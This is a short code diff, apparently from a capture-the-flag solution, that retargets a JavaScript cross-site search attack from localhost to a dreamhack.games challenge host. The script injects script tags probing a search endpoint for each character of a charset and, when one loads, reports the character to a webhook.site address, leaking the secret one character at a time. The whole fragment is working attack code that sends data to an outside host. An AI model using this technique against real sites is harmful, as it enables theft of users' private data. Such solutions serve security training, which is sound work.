@@ -11,7 +11,7 @@
   for (let i = 0; i < charset.length; i++) {
     const char = charset[i];
     let s = document.createElement('script');
-    s.src = `http://127.0.0.1:8000/search?query=${char}`;
+    s.src = `http://host8.dreamhack.games:16103/search?query=${char}`;
     s.onload = () => {
       fetch("https://webhook.site/45bcf449-d452-4bb5-a56f-c71d451ca12e/success?char=" + char);
     };
